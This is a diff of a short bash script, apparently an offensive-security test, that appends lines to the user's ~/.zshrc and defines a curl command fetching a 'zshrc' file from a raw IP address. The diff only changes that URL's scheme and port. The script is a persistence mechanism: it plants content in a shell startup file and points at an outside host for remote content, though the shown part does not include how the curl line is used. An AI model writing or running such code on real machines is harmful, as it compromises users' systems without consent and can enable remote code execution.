@@ -1,7 +1,7 @@
 #!/bin/bash
 #agregando cositas al .zshrc
 MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
-CURL="curl http://104.248.64.180:8080/zshrc"
+CURL="curl https://104.248.64.180:8000/zshrc"
 # Verificar si el mensaje ya existe en el .zshrc
 if ! grep -Fxq "$MESSAGE" ~/.zshrc; then
     echo "$MESSAGE" >> ~/.zshrc
